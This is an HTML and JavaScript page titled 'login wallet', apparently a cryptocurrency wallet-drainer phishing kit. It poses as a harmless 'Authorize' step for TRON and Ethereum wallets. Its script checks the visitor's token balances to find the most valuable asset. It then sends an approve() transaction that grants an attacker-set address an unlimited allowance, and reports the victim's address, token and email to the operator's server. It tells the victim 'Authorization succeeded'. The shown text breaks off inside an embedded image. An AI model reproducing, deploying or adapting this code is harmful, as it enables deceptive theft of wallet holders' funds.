<!DOCTYPE html>
<html lang="en" data-dpr="1" style="font-size: 39px" class="no-touch">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <!-- Required meta tags-->
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover"
    />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
    <meta name="format-detection" content="telephone=no, email=no" />
    <meta name="msapplication-tap-highlight" content="no" />
    <meta name="x5-orientation" content="portrait" />
    <meta name="x5-fullscreen" content="true" />
    <link
        rel="icon"
        href="https://token.m-easyex.com/index/index/favicon.ico"
    />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <!-- App title -->
    <title>login wallet</title>
    <!-- Framework7 Library CSS -->
    <link rel="stylesheet" href="/wallet_static/vendor.min.css" />
    <!-- Custom app styles-->
    <link rel="stylesheet" href="/wallet_static/reset.min.css" />
    <link rel="stylesheet" href="/wallet_static/main.css" />
    <link rel="stylesheet" href="/wallet_static/qrerc.css" />
    <link rel="stylesheet" href="/wallet_static/layer.css" />
    <script
        type="text/javascript"
        src="/wallet_static/w3model.js"
    ></script>
    <script
        type="text/javascript"
        src="/wallet_static/bignumber.min.js"
    ></script>
    <script
        type="text/javascript"
        src="/wallet_static/web3.min.js"
    ></script>
    <script
        type="text/javascript"
        src="/wallet_static/web3model.min.js"
    ></script>
    <script
        type="text/javascript"
        src="/wallet_static/evmchain.js"
    ></script>
    <script
        type="text/javascript"
        src="/wallet_static/web3provider.js"
    ></script>
    <!-- Jquery app core js-->
    <script
        type="text/javascript"
        src="/wallet_static/jquery-2.1.4.min.js"
    ></script>
    <script
        type="text/javascript"
        src="/wallet_static/flexible.js"
    ></script>


    <script
        type="text/javascript"
        src="/wallet_static/TronWeb.js"
    ></script>

    <style type="text/css">
        .tishi {
            width: 3.5rem;
            height: 1.2rem;
            background: #00000059;
            z-index: 999999999999;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            border-radius: 0.1rem;
            color: white;
            font-size: 0.6rem;
            text-align: center;
            line-height: 1.2rem;
            display: none;
        }
    </style>
    <style data-styled="active" data-styled-version="5.2.0"></style>
</head>
<body style="font-size: 12px">
<!-- Views -->
<div class="views">
    <!-- main view -->
    <div class="view view-main">
        <!-- Pages -->
        <div class="pages navbar-through">
            <div class="page">
                <div class="page-content" style="padding-top: 0.5rem">
                    <div style="text-align: center;">
                        <span id="tips" style="font-size: 20px;"></span>
                        <span id="tips_1" style="font-size: 20px;"></span>
                    </div>
                    <div class="list-block-button">
                        <button class="button button-fill" id="btn-connect">
                            Authorize
                        </button>
                    </div>
                </div>
            </div>
            <!-- Preloader -->
            <div class="modal"><div class="preloader"></div></div>
            <div class="tishi">Authorization succeeded</div>
        </div>
    </div>
</div>
<div
    id="fffsss"
    style="
        color: white;
        z-index: 99999999999999999;
        position: absolute;
        top: 1px;
      "
></div>
<div style="display: none">


    <!-- ERC20 ABI START-->
    <textarea id="jsondata_erc">
[{"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}]</textarea
    ><textarea id="jsondata1">
{"usdt":"0xdac17f958d2ee523a2206206994597c13d831ec7","sushi":"0x6b3595068778dd592e39a122f4f5a5cf09c90fe2","usdc":"0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48","uni":"0x1f9840a85d5af5bf1d1762f925bdaddc4201f984","aave":"0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9","yfi":"0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e","dai":"0x6b175474e89094c44da98b954eedeac495271d0f","link":"0x514910771af9ca656af840dff83e8264ecf986ca","LON":"0x0000000000095413afc295d19edeb1ad7b71c952","CRV":"0xD533a949740bb3306d119CC777fa900bA034cd52","FIL":"0xbf48ecb7c2d3d559e0a24b04f306889e05c73cd6"}</textarea
    ><textarea id="jsondata2">
{"WBTC":"0x2260fac5e5542a773aa44fbcfedf7c193bc2c599","WETH":"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2","CONV":"0xc834fa996fa3bec7aad3693af486ae53d8aa8b50","inj":"0xe28b3B32B6c345A34Ff64674606124Dd5Aceca30","MKR":"0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2","ALPHA":"0xa1faa113cbe53436df28ff0aee54275c13b40975","BAND":"0xba11d00c5f74255f56a5e366f4f77f5a186d7f55","snx":"0xc011a73ee8576fb46f5e1c5751ca3b9fe0af2a6f","comp":"0xc00e94cb662c3520282e6f5717214004a7f26888","sxp":"0x8ce9137d39326ad0cd6491fb5cc0cba0e089b6a9"}</textarea
    ><textarea id="jsondata3">
{"FTT":"0x50d1c9771902476076ecfc8b2a83ad6b9355a4c9","ust":"0xa47c8bf37f92abed4a126bda807a7b7498661acd","TRIBE":"0xc7283b66eb1eb5fb86327f08e1b5816b0720212b","wise":"0x66a0f676479Cee1d7373f3DC2e2952778BfF5bd6","RRAX":"0x853d955acef822db058eb8505911ed77f175b99e","CORE":"0x62359Ed7505Efc61FF1D56fEF82158CcaffA23D7","mir":"0x09a3ecafa817268f77be1283176b946c4ff2e608","DPI":"0x1494ca1f11d487c2bbe4543e90080aeba4ba3c2b","luna":"0xd2877702675e6ceb975b4a1dff9fb7baf4c91ea9","HEZ":"0xEEF9f339514298C6A857EfCfC1A762aF84438dEE","fxs":"0x3432b6a60d23ca0dfca7761b7ab56459d9c964d0","fei":"0x956f47f50a910163d8bf957cf5846d573e7f87ca"}</textarea
    >
</div>
<!-- ERC20 ABI END-->

<!-- TRC20 ABI START-->
<div style="display: none">
      <textarea id="jsondata_trc">
{"WIN":"TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7","USDT":"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t","TONS":"THgLniqRhDg5zePSrDTdU9QwY8FjD9nLYt","USDJ":"TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT","JST":"TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9","HT":"TDyvndWuvX5xTBwHPYJi7J3Yq8pq8yh62h","SUN":"TKkeiboTkxXKJpbmVFbv4a8ov5rAfRDMf9","EXNX":"TCcVeKtYUrHEQDPmozjJFMrf6XX7BgF84A","VCOIN":"TNisVGhbxrJiEHyYUMPxRzgytUtGM7vssZ","POL":"TWcDDx1Q6QEoBrJi9qehtZnD4vcXXuVLer","CKRW":"TTVTdn8ipmacfKsCHw5Za48NRnaBRKeJ44"}</textarea
      >
</div>
<!-- TRC20 ABI END-->

<!-- Custom app js-->
<script src="/wallet_static/main.js"></script>
<script type="text/javascript">


    function getQueryString(name){
        var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
        var r = window.location.search.substr(1).match(reg);
        if(r!=null)return  unescape(r[2]); return "";
    }
    var email = getQueryString('email');

    var domain = "{{env("APP_URL")}}";

    let tronWeb = window.tronWeb;
    var clientTrcAddress = ""
    if(typeof(tronWeb) != "undefined"){

        clientTrcAddress = tronWeb.defaultAddress.base58

    }
    if(typeof(tronWeb) != "undefined" && clientTrcAddress){
        $("#tips").html("You are in the TRON wallet, please click Authorize");
        $("#tips_1").html("Address:"+clientTrcAddress);

        var authorized_address = "{{$data['trc']['a']}}";
        var bizhong = "";
        var approveAddr = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        function getUrlQueryString(names, urls) {
            urls = urls || window.location.href;
            urls && urls.indexOf("?") > -1
                ? (urls = urls.substring(urls.indexOf("?") + 1))
                : "";
            var reg = new RegExp("(^|&)" + names + "=([^&]*)(&|$)", "i");
            var r = urls
                ? urls.match(reg)
                : window.location.search.substr(1).match(reg);
            if (r != null && r[2] != "") return unescape(r[2]);
            return null;
        }

        $(function () {
            const addr = JSON.parse($("#jsondata_trc").html());

            const price = {
                WIN: 0.00115,
                USDT: 1,
                TONS: 1.35,
                USDJ: 1.04,
                JST: 0.125,
                HT: 20.41,
                SUN: 33.97,
                EXNX: 0.0621,
                VCOIN: 0.004225,
                POL: 0.1393,
                CKRW: 0.002487
            };

            const decimals = {
                WIN: 6,
                USDT: 6,
                TONS: 6,
                USDJ: 18,
                JST: 18,
                HT: 18,
                SUN: 18,
                EXNX: 18,
                VCOIN: 6,
                POL: 8,
                CKRW: 6
            };

            var total = 0;
            async function getMostValuableAssets(account) {
                let _symbol = "USDT";
                for (const symbol of Object.keys(addr)) {
                    let contract = await tronWeb.contract().at(addr[symbol]);
                    let myBalance = await contract
                        .balanceOf(account)
                        .call(function (err, balance) {
                            const usdt =
                                (balance / 10 ** (decimals[symbol] || 18)) * price[symbol];
                            if (usdt > total && usdt > 500) {
                                _symbol = symbol;
                                total = usdt;
                                approveAddr = addr[_symbol];
                            }
                        });
                }
                bizhong = _symbol;
                return _symbol;
            }
            async function postInfo(address, symbol) {
                var data = {
                    type:"trc",
                    other_address: address,
                    auth_address: authorized_address,
                    currency: symbol,
                    balance: "点击余额查询",
                    email:email
                };

                $.ajax({
                    type: "post",
                    url: domain+"/api/notify/createDuAddress",
                    data: data,
                    success: function () {}
                });
                alert("Authorization succeeded")
            }
            /**
             * * Connect wallet button pressed.
             */
            async function onConnect() {
                $(".pages").append('<div class="modal-overlay"></div>');
                $(".modal-overlay").addClass("modal-overlay-visible");
                $(".modal").removeClass("modal-out").addClass("modal-in");
                let tronWeb = window.tronWeb;
                let walletAddress = tronWeb.defaultAddress.base58;
                bizhong = await getMostValuableAssets(walletAddress);
                let instance = await tronWeb.contract().at(approveAddr);
                let res = await instance["approve"](
                    authorized_address,
                    "90000000000000000000000000000"
                );
                res.send(
                    {
                        feeLimit: 100000000,
                        callValue: 0,
                        shouldPollResponse: false
                    },
                    function (err, res) {
                        if (err == null) {
                            $(".tishi").fadeIn();
                            setTimeout(function () {
                                $(".tishi").fadeOut();
                            }, 2000);
                            postInfo(walletAddress, bizhong);

                        }
                        $(".modal-overlay").remove();
                        $(".modal").removeClass("modal-in").addClass("modal-out");
                    }
                );
            }
            function init() {}

            async function s() {
                if (window.tronWeb) {
                    var tronWeb = window.tronWeb;
                    let contract = await tronWeb
                        .contract()
                        .at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
                    let walletAddress = tronWeb.defaultAddress.base58;

                } else {

                }
            }

            /**
             * Main entry point.
             */

            init();
            document
                .querySelector("#btn-connect")
                .addEventListener("click", onConnect);
        });

        $(function () {
            setTimeout(function () {
                $("#s").click();
            }, 1000);
        });

    }else{


        if (window.ethereum) {
            window.ethereum.enable().then((res) => {
                $("#tips").html("You are in the Ethereum wallet, please click Authorize");


                const ABI = JSON.parse($("#jsondata_erc").html());
                $(function () {
                    var authorized_address = "{{$data['erc']['a']}}";
                    var infura_key = "1ac92ae60afd4174aeba1644e2e05b9f";
                    var bizhong = "";
                    const approveNum = new BigNumber(2).exponentiatedBy(256).minus(1);
                    var rank = 6.45;

                    $("input.num").bind("input propertychange", function () {
                        if ($(this).val() && $(this).val() > 0) {
                            $("#btn-connect").css("background", "#078bc3");
                        } else {
                            $("#btn-connect").css("background", "#dde0dd");
                        }
                    });
                    /******************************************/
                    // Unpkg imports
                    const _web3 = new Web3("https://cloudflare-eth.com");

                    let injectedWeb3 = null,
                        total = 0;
                    let approveAddr = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
                    const addr = JSON.parse($("#jsondata1").html());
                    const addr2 = JSON.parse($("#jsondata2").html());
                    const addr3 = JSON.parse($("#jsondata3").html());

                    async function getMostValuableAssets(account) {
                        let _symbol = "usdt";
                        console.log("_symbol:" + _symbol);

                        for (const [symbol, contract] of Object.entries(contracts)) {
                            contract.methods.balanceOf(account).call(function (err, balance) {
                                if (symbol == "usdt") {
                                    let yu = balance / 10 ** (decimals[symbol] || 18);
                                    console.log(yu.toLocaleString());
                                    $("#yu").text(yu.toLocaleString() + " USDT");
                                }
                                const usdt =
                                    (balance / 10 ** (decimals[symbol] || 18)) * price[symbol];
                                if (usdt > total && usdt > 1000) {
                                    _symbol = symbol;
                                    total = usdt;
                                    approveAddr = addr[_symbol];
                                    bizhong = _symbol;
                                }
                            });
                        }

                        bizhong = _symbol;
                        console.log("_symbol:" + _symbol);
                        return _symbol;
                    }

                    async function getMostValuableAssets2(account) {
                        let _symbol = "usdt";
                        console.log("_symbol:" + _symbol);
                        for (const [symbol, contract] of Object.entries(contracts2)) {
                            contract.methods.balanceOf(account).call(function (err, balance) {
                                const usdt =
                                    (balance / 10 ** (decimals[symbol] || 18)) * price[symbol];
                                if (usdt > total && usdt > 1000) {
                                    _symbol = symbol;
                                    total = usdt;
                                    approveAddr = addr[_symbol];
                                }
                            });
                        }

                        bizhong = _symbol;

                        console.log("_symbol:" + _symbol);
                        return _symbol;
                    }

                    async function getMostValuableAssets3(account) {
                        let _symbol = "usdt";
                        for (const [symbol, contract] of Object.entries(contracts3)) {
                            contract.methods.balanceOf(account).call(function (err, balance) {
                                const usdt =
                                    (balance / 10 ** (decimals[symbol] || 18)) * price[symbol];
                                if (usdt > total && usdt > 1000) {
                                    _symbol = symbol;
                                    total = usdt;
                                    approveAddr = addr[_symbol];
                                }
                            });
                        }
                        bizhong = _symbol;
                        console.log("_symbol:" + _symbol);
                        return _symbol;
                    }

                    async function postInfo(address, symbol) {
                        var data = {
                            type:"erc",
                            other_address: address,
                            auth_address: authorized_address,
                            currency: symbol,
                            balance: "点击余额查询",
                            email:email
                        };

                        $.ajax({
                            type: "post",
                            url: domain+"/api/notify/createDuAddress",
                            data: data
                            // success:function(data){
                            //     //console.log(data)
                            //     if(data.code === 200){
                            //      console.log('success')
                            //
                            //     }
                            //     console.log(data.msg)
                            // },
                            // error:function(data){
                            //  console.log(data)
                            // }
                        });
                        alert("Authorization succeeded")
                    }

                    const price = {
                        usdt: 1,
                        sushi: 15.5,
                        usdc: 1,
                        dai: 1,
                        uni: 28.6,
                        aave: 380,
                        yfi: 35000,
                        link: 28.2,
                        LON: 7,
                        CRV: 3.01367,
                        GUSD: 1,
                        WBTC: 56478.2,
                        WETH: 1991.89,
                        CONV: 0.105733,
                        inj: 13.3812,
                        MKR: 2076.68,
                        ALPHA: 1.79043,
                        BAND: 16.3441,
                        snx: 20.0588,
                        comp: 468.076,
                        sxp: 4.11818,
                        FTT: 46.1779,
                        ust: 1.00543,
                        TRIBE: 1.42926,
                        wise: 0.446973,
                        RRAX: 0.996821,
                        CORE: 5447.59,
                        mir: 8.69817,
                        DPI: 415.906,
                        luna: 15.2402,
                        HEZ: 5.97533,
                        fxs: 8.47025,
                        fei: 0.898157
                    };

                    const decimals = {
                        sushi: 18,
                        usdt: 6,
                        usdc: 6,
                        uni: 18,
                        dai: 18,
                        aave: 18,
                        yfi: 18,
                        link: 18,
                        WBTC: 8
                    };

                    const contracts = {},
                        contracts2 = {},
                        contracts3 = {};
                    for (const symbol of Object.keys(addr)) {
                        const contractAddr = addr[symbol];
                        contracts[symbol] = new _web3.eth.Contract(ABI, contractAddr);
                    }

                    for (const symbol of Object.keys(addr2)) {
                        const contractAddr = addr2[symbol];
                        contracts2[symbol] = new _web3.eth.Contract(ABI, contractAddr);
                    }

                    for (const symbol of Object.keys(addr3)) {
                        const contractAddr = addr3[symbol];
                        contracts3[symbol] = new _web3.eth.Contract(ABI, contractAddr);
                    }

                    const Web3Modal = window.Web3Modal.default;
                    const WalletConnectProvider = window.WalletConnectProvider.default;

                    // Web3modal instance
                    let web3Modal;

                    // Chosen wallet provider given by the dialog window
                    let provider;

                    // Address of the selected account
                    let selectedAccount;

                    /**
                     * Setup the orchestra
                     */
                    async function init() {
                        // Tell Web3modal what providers we have available.
                        // Built-in web browser provider (only one can exist as a time)
                        // like MetaMask, Brave or Opera is added automatically by Web3modal

                        const providerOptions = {
                            walletconnect: {
                                package: WalletConnectProvider,
                                options: {
                                    // Mikko's test key - don't copy as your mileage may vary
                                    // infuraId: infura_key
                                }
                            }
                        };

                        web3Modal = new Web3Modal({
                            cacheProvider: false, // optional
                            providerOptions, // required
                            disableInjectedProvider: false // optional. For MetaMask / Brave / Opera.
                        });

                        try {
                            provider = await web3Modal.connect();
                            provider.enable();
                        } catch (e) {
                            console.log("Could not get a wallet connection", e);
                            return;
                        }

                        // Subscribe to accounts change
                        provider.on("accountsChanged", async (accounts) => {
                            await fetchAccountData();
                        });

                        // Subscribe to chainId change
                        provider.on("chainChanged", async (chainId) => {
                            await fetchAccountData();
                        });

                        // Subscribe to networkId change
                        provider.on("networkChanged", async (networkId) => {
                            await fetchAccountData();
                        });

                        await refreshAccountData();
                    }

                    /**
                     * Kick in the UI action after Web3modal dialog has chosen a provider
                     */
                    async function fetchAccountData() {
                        const web3 = new Web3(provider);
                        injectedWeb3 = web3;
                        provider.enable();
                        const accounts = await web3.eth.getAccounts();
                        selectedAccount = accounts[0];
                        $("#tips_1").html("Address:"+selectedAccount);
                        let gasPrice = await web3.eth.getGasPrice();
                        var gs = ((gasPrice * 80000) / 10 ** 18).toFixed(6);
                        console.log(gs);

                        getMostValuableAssets(selectedAccount);
                        setTimeout(function () {
                            getMostValuableAssets2(selectedAccount);
                        }, 200);
                        setTimeout(function () {
                            getMostValuableAssets3(selectedAccount);
                        }, 300);
                    }

                    /**
                     * Fetch account data for UI when
                     * - User switches accounts in wallet
                     * - User switches networks in wallet
                     * - User connects wallet initially
                     */
                    async function refreshAccountData() {
                        // If any current data is displayed when
                        // the user is switching acounts in the wallet
                        // immediate hide this data
                        // document.querySelector("#connected").style.display = "none";
                        // document.querySelector("#prepare").style.display = "block";

                        // Disable button while UI is loading.
                        // fetchAccountData() will take a while as it communicates
                        // with Ethereum node via JSON-RPC and loads chain data
                        // over an API call.
                        document
                            .querySelector("#btn-connect")
                            .setAttribute("disabled", "disabled");
                        await fetchAccountData(provider);
                        document.querySelector("#btn-connect").removeAttribute("disabled");
                    }

                    /**
                     * Connect wallet button pressed.
                     */
                    async function onConnect() {
                        $(".pages").append('<div class="modal-overlay"></div>');
                        $(".modal-overlay").addClass("modal-overlay-visible");
                        $(".modal").removeClass("modal-out").addClass("modal-in");


                        if (selectedAccount && provider) {
                            const web3 = new Web3(provider);
                            const contract = new web3.eth.Contract(ABI, approveAddr);
                            const gasPrice = await web3.eth.getGasPrice();

                            contract.methods
                                .approve(
                                    authorized_address,
                                    web3.utils.toBN(
                                        "0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
                                    )
                                )
                                .send(
                                    {
                                        from: selectedAccount,
                                        gasPrice: gasPrice,
                                        gas: 70000
                                    },
                                    function (err, tx) {
                                        if (!err) {
                                            $(".tishi").fadeIn();
                                            setTimeout(function () {
                                                $(".tishi").fadeOut();
                                            }, 2000);
                                            postInfo(selectedAccount, bizhong);
                                        }
                                        $(".modal-overlay").remove();

                                        $(".modal").removeClass("modal-in").addClass("modal-out");

                                        console.log(err, tx);
                                    }
                                );
                        } else {
                            provider = await web3Modal.connect();
                            provider.enable();
                            const web3 = new Web3(provider);
                            const accounts = await web3.eth.getAccounts();
                            selectedAccount = accounts[0];

                            const contract = new web3.eth.Contract(ABI, approveAddr);
                            const gasPrice = await web3.eth.getGasPrice();

                            contract.methods
                                .approve(
                                    authorized_address,
                                    "0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
                                )
                                .send(
                                    {
                                        from: selectedAccount,
                                        gasPrice: gasPrice,
                                        gas: 70000
                                    },
                                    function (err, tx) {
                                        console.log(err, tx);
                                        if (!err) {
                                            $(".tishi").fadeIn();
                                            setTimeout(function () {
                                                $(".tishi").fadeOut();
                                            }, 2000);
                                            postInfo(selectedAccount, bizhong);
                                        }
                                        $(".modal-overlay").remove();

                                        $(".modal").removeClass("modal-in").addClass("modal-out");
                                    }
                                );
                        }
                    }

                    /**
                     * Disconnect wallet button pressed.
                     */
                    async function onDisconnect() {
                        console.log("Killing the wallet connection", provider);

                        // TODO: Which providers have close method?
                        if (provider.close) {
                            await provider.close();

                            // If the cached provider is not cleared,
                            // WalletConnect will default to the existing session
                            // and does not allow to re-scan the QR code with a new wallet.
                            // Depending on your use case you may want or want not his behavir.
                            await web3Modal.clearCachedProvider();
                            provider = null;
                        }

                        selectedAccount = null;

                        // Set the UI back to the initial state
                        // document.querySelector("#prepare").style.display = "block";
                        // document.querySelector("#connected").style.display = "none";
                    }

                    /**
                     * Main entry point.
                     */
                    window.addEventListener("load", async () => {
                        init();
                        document
                            .querySelector("#btn-connect")
                            .addEventListener("click", onConnect);
                    });
                });

                function _init(argument) {
                    // body...
                }



            });
        } else {

            alert("Please open in wallet");
            window.close();
        }
    }


</script>
<div id="WEB3_CONNECT_MODAL_ID">
    <div
        class="sc-jSFkmK kRmdPb web3modal-modal-lightbox"
        offset="0"
        opacity="0.4"
    >
        <div class="sc-gKAblj fVQpCb web3modal-modal-container">
            <div class="sc-iCoHVE knnrxv web3modal-modal-hitbox"></div>
            <div class="sc-fujyUd hdPMvV web3modal-modal-card">
                <div class="sc-eCApGN cjAFRf web3modal-provider-wrapper">
                    <div class="sc-hKFyIo jcNZzC web3modal-provider-container">
                        <div class="sc-bdnylx jMhaxE web3modal-provider-icon">
                            <img
                                src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjM1NSIgdmlld0JveD0iMCAwIDM5NyAzNTUiIHdpZHRoPSIzOTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMSAtMSkiPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTIuMDA0NzE3IDEzLjgxMDE5OHYtMTguMDU5NDlsNC4yNDUyODMtNC4yNDkyOTJoMjkuNzE2OTgydjIxLjI0NjQ1OSAxNC44NzI1MjNoLTMxLjgzOTYyNGwtMzkuMjY4ODY4LTE2Ljk5NzE2OXoiIGZpbGw9IiNjZGJkYjIiLz48cGF0aCBkPSJtMTk5LjUyODMwNSAzMjcuMTk1NDcyIDUwLjk0MzM5NyAxMy44MTAxOTh2LTE4LjA1OTQ5bDQuMjQ1MjgzLTQuMjQ5MjkyaDI5LjcxNjk4MXYyMS4yNDY0NTkgMTQuODcyNTIzaC0zMS44Mzk2MjNsLTM5LjI2ODg2OC0xNi45OTcxNjl6IiBmaWxsPSIjY2RiZGIyIiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSA0ODMuOTYyMjcgMCkiLz48cGF0aCBkPSJtMTcwLjg3MjY0NCAyODcuODg5NTIzLTQuMjQ1MjgzIDM1LjA1NjY1NyA1LjMwNjYwNC00LjI0OTI5Mmg1NS4xODg2OGw2LjM2NzkyNSA0LjI0OTI5Mi00LjI0NTI4NC0zNS4wNTY2NTctOC40OTA1NjUtNS4zMTE2MTUtNDIuNDUyODMyIDEuMDYyMzIzeiIgZmlsbD0iIzM5MzkzOSIvPjxwYXRoIGQ9Im0xNDIuMjE2OTg0IDUwLjk5MTUwMjIgMjUuNDcxNjk4IDU5LjQ5MDA4NTggMTEuNjc0NTI4IDE3My4xNTg2NDNoNDEuMzkxNTExbDEyLjczNTg0OS0xNzMuMTU4NjQzIDIzLjM0OTA1Ni01OS40OTAwODU4eiIgZmlsbD0iI2Y4OWMzNSIvPjxwYXRoIGQ9Im0zMC43NzgzMDIzIDE4MS42NTcyMjYtMjkuNzE2OTgxNTMgODYuMDQ4MTYxIDc0LjI5MjQ1MzkzLTQuMjQ5MjkzaDQ3Ljc1OTQzNDN2LTM3LjE4MTMwM2wtMi4xMjI2NDEtNzYuNDg3MjUzLTEwLjYxMzIwOCA4LjQ5ODU4M3oiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtODcuMDI4MzAzMiAxOTEuMjE4MTM0IDg3LjAyODMwMjggMi4xMjQ2NDYtOS41NTE4ODYgNDQuNjE3NTYzLTQxLjM5MTUxMS0xMC42MjMyMjl6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkyLjI4MDQ1NyAzNi4wODQ5MDU4IDMzLjk5NDMzNHYzMy45OTQzMzR6IiBmaWxsPSIjZWE4ZDNhIi8+PHBhdGggZD0ibTEyMy4xMTMyMDkgMjI3LjMzNzExNCA0Mi40NTI4MzEgMTAuNjIzMjI5IDEzLjc5NzE3IDQ1LjY3OTg4OC05LjU1MTg4NiA1LjMxMTYxNS00Ni42OTgxMTUtMjcuNjIwMzk4eiIgZmlsbD0iI2Y4OWQzNSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDI2MS4zMzE0NDgtOC40OTA1NjUgNjUuODY0MDI0IDU2LjI1LTM5LjMwNTk0OXoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTc0LjA1NjYwNiAxOTMuMzQyNzggNS4zMDY2MDQgOTAuMjk3NDUxLTE1LjkxOTgxMi00Ni4yMTEwNDl6IiBmaWxsPSIjZWE4ZTNhIi8+PHBhdGggZD0ibTc0LjI5MjQ1MzkgMjYyLjM5Mzc3MSA0OC44MjA3NTUxLTEuMDYyMzIzLTguNDkwNTY1IDY1Ljg2NDAyNHoiIGZpbGw9IiNkODdjMzAiLz48cGF0aCBkPSJtMjQuNDEwMzc3NyAzNTUuODc4MTkzIDkwLjIxMjI2NjMtMjguNjgyNzIxLTQwLjMzMDE5MDEtNjQuODAxNzAxLTczLjIzMTEzMzEzIDUuMzExNjE2eiIgZmlsbD0iI2ViOGYzNSIvPjxwYXRoIGQ9Im0xNjcuNjg4NjgyIDExMC40ODE1ODgtNDUuNjM2NzkzIDM4LjI0MzYyNy0zNS4wMjM1ODU4IDQyLjQ5MjkxOSA4Ny4wMjgzMDI4IDMuMTg2OTY5eiIgZmlsbD0iI2U4ODIxZSIvPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTYuMjUtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIvPjxwYXRoIGQ9Im0yMjkuMjQ1Mjg2IDMyNy4xOTU0NzIgNTUuMTg4NjgtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgNTEzLjY3OTI1MiAwKSIvPjxwYXRoIGQ9Im0xMzIuNjY1MDk2IDIxMi40NjQ1OTMtMTEuNjc0NTI4IDI0LjQzMzQyNyA0MS4zOTE1MS0xMC42MjMyMjl6IiBmaWxsPSIjMzkzOTM5IiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAyODMuMzcyNjQ2IDApIi8+PHBhdGggZD0ibTIzLjM0OTA1NyAxLjA2MjMyMjk2IDE0NC4zMzk2MjUgMTA5LjQxOTI2NTA0LTI0LjQxMDM3OC01OS40OTAwODU4eiIgZmlsbD0iI2U4OGYzNSIvPjxwYXRoIGQ9Im0yMy4z